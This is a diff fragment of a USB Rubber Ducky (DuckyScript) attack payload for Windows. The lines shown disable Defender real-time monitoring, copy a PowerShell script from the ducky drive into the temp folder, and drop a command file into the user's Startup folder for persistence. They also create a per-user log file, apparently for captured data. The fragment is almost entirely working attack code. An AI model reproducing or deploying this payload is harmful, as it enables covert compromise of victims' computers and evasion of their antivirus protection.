@@ -17,7 +17,7 @@ STRING Set-MpPreference -DisableRealtimeMonitoring $true;
 REM STAGE 3
 REM move files to appropiate directories
 REM change 'L' to the name of your ducky
-STRING $u=gwmi Win32_Volume|?{$_.Label -eq'L'}|select name;cd $u.name;cp .\l.ps1 $env:temp;cp .\c.cmd "C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";cd $env:temp;echo "">"$env:UserName.log";
+STRING $u=gwmi Win32_Volume|?{$_.Label -eq'L'}|select name;cd $u.name;cp .\p.ps1 $env:temp;cp .\c.cmd "C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";cd $env:temp;echo "">"$env:UserName.log";
 ENTER
 DELAY 200
 
